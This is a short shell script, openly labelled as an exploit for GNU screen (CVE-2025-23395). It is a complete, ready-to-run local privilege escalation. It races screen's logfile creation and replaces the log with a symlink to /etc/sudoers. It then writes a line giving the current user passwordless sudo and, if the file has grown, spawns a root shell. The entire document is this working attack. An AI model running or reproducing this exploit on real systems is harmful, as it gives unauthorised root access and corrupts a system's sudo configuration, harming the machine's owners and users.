#!/bin/sh
# screen CVE-2025-23395 exploit
# blablabla
# blasty <peter@haxx.in>
F=$(mktemp)
L=${HOME}/screen.log
T=/etc/sudoers
rm -rf $F $L
mkfifo $F
O=$(stat --printf="%s" $T)
echo "[+] spawning GNU screen"
screen -L -Logfile $L -dmS hax sh -c "cat $F"
while [ ! -f $L ]; do sleep 0.1; done
echo "[+] logfile appeared, doing hax"
rm $L
ln -s $T $L
P="${USER} ALL=(ALL) NOPASSWD:ALL"
(echo $P; for i in `seq 8192`; do echo; done) > $F
if [ $(stat --printf="%s" $T) -gt $O ] ; then
        echo "[+] bl1ng bl1ng, we got it"
        sudo sh
else
        echo "[-] exploit failed :("
fi
rm -rf $F $L
